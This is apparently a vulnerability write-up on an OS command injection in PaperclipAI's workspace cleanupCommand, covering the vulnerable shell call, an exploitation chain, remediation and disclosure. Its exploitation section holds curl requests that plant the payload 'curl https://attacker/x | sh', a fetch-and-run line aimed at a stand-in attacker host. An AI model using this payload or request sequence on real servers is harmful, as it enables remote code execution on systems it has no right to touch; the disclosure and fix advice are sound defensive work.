---
title: "OS Command Injection via Execution-Workspace cleanupCommand in Paperclip"
date: 2026-08-14
author: "Yuval Elbar"
tags: ["command-injection", "rce", "nodejs", "paperclipai"]
---

**PaperclipAI · Critical (9.8) · CWE-78 · Fixed in 2026.416.0**

> **TL;DR** — Paperclip's execution-workspace lifecycle accepted a `cleanupCommand` field and, when a workspace was archived, ran it through a shell — `spawn(shell, ["-c", command])` with no validation, allowlisting, or escaping. Five ordinary HTTP requests turn into remote code execution as the server process.

## The bug in one sentence

User-supplied input reaches `-c` of a shell. That's the whole story of OS Command Injection (CWE-78), and it's still one of the most reliable paths to RCE.

## Where it lived

In the execution-workspace lifecycle component (`workspace-runtime.ts`), the endpoint `PATCH /api/execution-workspaces/:id` accepted a `cleanupCommand` field and stored it on the workspace. When the workspace later transitioned to **archived**, the runtime executed that command via shell invocation:

```javascript
// conceptually:
spawn(shell, ["-c", command]);   // command === attacker-controlled cleanupCommand
```

No sanitization, no allowlist, no escaping. Whatever string sat in `cleanupCommand` ran on the host with the privileges of the server process.

## Exploitation chain

The attack is a short, boring sequence of API calls — which is what makes it dangerous, because none of the individual steps look alarming:

1. Discover a company / tenant.
2. Locate an execution workspace.
3. Reactivate it if it isn't active.
4. Inject a payload into the `cleanupCommand` field via `PATCH`.
5. Archive the workspace → the lifecycle fires the cleanup command → code executes.

```bash
# Step 4 - plant the payload
curl -X PATCH https://target/api/execution-workspaces/$WS_ID \
  -H "Content-Type: application/json" \
  -d '{"cleanupCommand": "curl https://attacker/x | sh"}'

# Step 5 - archive to trigger execution
curl -X PATCH https://target/api/execution-workspaces/$WS_ID \
  -H "Content-Type: application/json" \
  -d '{"status": "archived"}'
```

## Impact

Remote code execution as the server process. From there: data exfiltration, lateral movement, supply-chain tampering, persistence, and potential privilege escalation on the host.

## The right fix

The advisory's remediation is a good checklist for *any* "run a command" feature:

- **Don't shell out.** Replace `spawn(shell, ["-c", cmd])` with `execFile(bin, [args...])` using an argument array, so there is no shell to inject into.
- **Allowlist** the permitted operations rather than accepting arbitrary command strings.
- **Validate and sanitize** all inputs on the endpoint.
- **Authorization checks** on the lifecycle transition, and separation of sensitive config updates from routine ones.
- **Sandbox** any execution that genuinely must happen.

> **The one-line rule.** If a feature must run external programs, pass an executable plus an argument array — never build a command string and hand it to a shell. `execFile`/`spawn` without a shell removes the entire injection surface.

## Disclosure

Reported through GitHub Security Advisories; fixed in paperclip 2026.416.0.

## References

- [GHSA-vr7g-88fq-vhq3 (advisory)](https://github.com/paperclipai/paperclip/security/advisories/GHSA-vr7g-88fq-vhq3)
- [CWE-78: OS Command Injection (MITRE)](https://cwe.mitre.org/data/definitions/78.html)
